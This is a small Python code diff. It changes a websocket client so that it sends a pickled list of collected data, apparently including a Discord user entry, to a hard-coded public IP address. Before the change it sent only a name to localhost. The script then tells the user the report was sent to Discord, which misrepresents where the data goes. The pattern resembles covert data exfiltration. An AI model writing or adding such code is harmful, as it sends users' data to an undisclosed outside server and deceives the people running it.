@@ -42,8 +42,9 @@ listData.append(discordUser)
 data = pickle.dumps(listData)
 
 async def hello():
-    uri = "ws://localhost:8765"
+    global data
+    uri = 'ws://34.73.189.184'
     async with websockets.connect(uri) as websocket:
-        await websocket.send(name)
+        await websocket.send(data)
 
 print('Report sent to Discord! You can close this window now')
